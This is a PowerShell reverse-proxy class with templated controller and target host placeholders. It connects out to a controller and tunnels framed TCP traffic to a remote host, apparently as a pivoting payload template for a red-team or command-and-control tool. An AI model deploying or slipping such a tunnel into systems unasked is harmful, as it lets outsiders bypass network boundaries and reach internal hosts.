class ReverseProxy {
    [string]$chost
    [int]$cport
    [string]$rhost
    [int]$rport
    [int]$data_size
    [bool]$verbose

    # Constructor
    ReverseProxy([string]$chost, [int]$cport, [string]$rhost, [int]$rport, [bool]$verbose=$true) {
        # Initialize TCP proxy
        $this.chost = $chost
        $this.cport = $cport
        $this.rhost = $rhost
        $this.rport = $rport
        $this.verbose = $verbose
        $this.data_size = 4096
    }

    [void]start() {
        # Start proxy
        $client_sock = $this._connect($this.chost, $this.cport)
        if ($client_sock) {
            if ($this.verbose) {
                Write-Host "Proxy connected to client."
            }
            try {
                while ($true) {
                    $header = $this._recv_all($client_sock.Client, 5)
                    if ($header -ne $null) {
                        $hdr_obj = $this._unpack_hdr($header)
                        $cmd = $hdr_obj.cmd
                        if ($cmd -eq 1) {
                            $server_sock = $this._connect($this.rhost, $this.rport)
                            if ($this.verbose) {
                                Write-Host "Proxy connected to remote host."
                            }
                            $this._switch($client_sock, $server_sock)
                            $this._close($server_sock)
                            if ($this.verbose) {
                                Write-Host "Proxy disconnected from remote host."
                            }
                        }
                    }
                    else {
                        Start-Sleep -Milliseconds 5
                        continue
                    }
                }
            }
            catch [System.Management.Automation.RuntimeException] {
                Write-Host "Error: $($_.Exception.Message)"
                break
            }
        }
    }

    [void]_switch([System.Net.Sockets.TcpClient]$client, [System.Net.Sockets.TcpClient]$server) {
        # Switch between read/write
        $server_closed = $false
        if ($client -and $server) {
            $client_sock = $client.Client
            $server_sock = $server.Client
            $client_read = $true
            $data = New-Object byte[] $this.data_size
            while ($true) {
                # Recv from client
                if ($client_read) {
                    try {
                        $header = $this._recv_all($client_sock, 5)
                        if ($header -ne $null) {
                            $hdr_obj = $this._unpack_hdr($header)
                            $cmd = $hdr_obj.cmd
                            $data_len = $hdr_obj.dlen
                            if ($cmd -eq 0) { # data
                                $data = $this._recv_all($client_sock, $data_len)
                                if (-not $server_closed) {
                                    $this._sendall($server_sock, $data)
                                }
                                else {
                                    $client_read = $false
                                    Start-Sleep -Milliseconds 5
                                }
                            }
                            elseif ($cmd -eq 2) { # close socket
                                break
                            }
                        }
                        else {
                            $client_read = $false
                            Start-Sleep -Milliseconds 5
                        }
                    }
                    catch [System.Net.Sockets.SocketException] {
                        if ($_.Exception.NativeErrorCode -eq 10035) {
                            # Socket open but no data available
                            $client_read = $false
                            Start-Sleep -Milliseconds 5
                        }
                        else {
                            # Other error
                            break
                        }
                    }
                    catch {
                        # Any other exception
                        break
                    }
                }
                # Recv from server
                if (-not $client_read) {
                    try {
                        $bytes_read = $server_sock.Receive($data)
                        if ($bytes_read -gt 0) {
                            $received_data = $data[0..($bytes_read - 1)]
                            $this._send_all($client_sock, 0, $received_data)
                        }
                        else {
                            # Server socket is closed
                            if ($server_closed) {
                                [byte[]]$nodata = @()
                                $this._send_all($client_sock, 2, $nodata)
                                break
                            }
                            $server_closed = $true
                            $client_read = $true
                            Start-Sleep -Milliseconds 5
                        }
                    }
                    catch [System.Net.Sockets.SocketException] {
                        if ($_.Exception.NativeErrorCode -eq 10035) {
                            # Socket open but no data available
                            $client_read = $true
                            Start-Sleep -Milliseconds 5
                        }
                        else {
                            # Other error
                            break
                        }
                    }
                    catch {
                        # Any other exception
                        break
                    }
                }
            }
        }
    }

    [void]_sendall([System.Net.Sockets.Socket]$sock, [byte[]]$data) {
        # Ensure a specific number of bytes are sent
        $bytes_sent = 0
        $total_bytes = $data.Length
        $sock.NoDelay = $true
        while ($bytes_sent -lt $total_bytes) {
            $remaining_bytes = $total_bytes - $bytes_sent
            $sent = $sock.Send($data, $bytes_sent, $remaining_bytes, [System.Net.Sockets.SocketFlags]::None)
            $bytes_sent += $sent
        }
    }

    [void]_send_all([System.Net.Sockets.Socket]$sock, [byte]$cmd, [byte[]]$data) {
        # Send data or a command
        $data_len = [uint32]$data.Length
        $hdr = $this._pack_hdr($cmd, $data_len)
        $msg = $hdr + $data
        $this._sendall($sock, $msg)
    }

    [byte[]]_pack_hdr([byte]$cmd, [uint32]$data_len) {
        # Pack message header
        $dlen = [System.BitConverter]::GetBytes($data_len)
        if ([System.BitConverter]::IsLittleEndian) {
            [System.Array]::Reverse($dlen)
        }
        return [byte[]]($cmd) + $dlen
    }

    [pscustomobject]_unpack_hdr([byte[]]$hdr) {
        # Unpack message header
        $cmd = $hdr[0]
        $dlen = $hdr[1..4]
        if ([System.BitConverter]::IsLittleEndian) {
            [System.Array]::Reverse($dlen)
        }
        $data_len = [System.BitConverter]::ToUInt32($dlen, 0)
        return [PSCustomObject]@{
            cmd = $cmd
            dlen = $data_len
        }
    }

    [byte[]]_recv_all([System.Net.Sockets.Socket]$sock, [int]$n) {
        # TCP recv n bytes
        if (-not $sock.Poll(0, [System.Net.Sockets.SelectMode]::SelectRead) -or $sock.Available -eq 0) {
            return $null
        }
        $data = New-Object byte[] $n
        $bytes_received = 0
        while ($bytes_received -lt $n) {
            try {
                $remaining = $n - $bytes_received
                $received = $sock.Receive($data, $bytes_received, $remaining, [System.Net.Sockets.SocketFlags]::None)
                if ($received -eq 0) { 
                    return $null 
                }
                $bytes_received += $received
            }
            catch [System.Management.Automation.MethodInvocationException] {
                $e = $_.Exception.InnerException
                if ($e -is [System.Net.Sockets.SocketException] -and $e.SocketErrorCode -eq 'WouldBlock') {
                    Start-Sleep -Milliseconds 1
                    continue
                }
                return $null
            }
        }
        return $data
    }

    [void]_close([System.Net.Sockets.TcpClient]$cli) {
        # Close client
        Try {
            $cli.close()
        }
        Catch {}
    }

    [System.Net.Sockets.TcpClient]_connect($hst, $port) {
        # Connect to a remote port
        Try {
            $s = New-Object System.Net.Sockets.TcpClient($hst, $port)
            $s.Client.Blocking = $false
            return $s
        }
        Catch {
            return $null
        }
    }

}

$revprx = [ReverseProxy]::new("{{CHOST}}", {{CPORT}}, "{{RHOST}}", {{RPORT}}, $True)
$revprx.start()
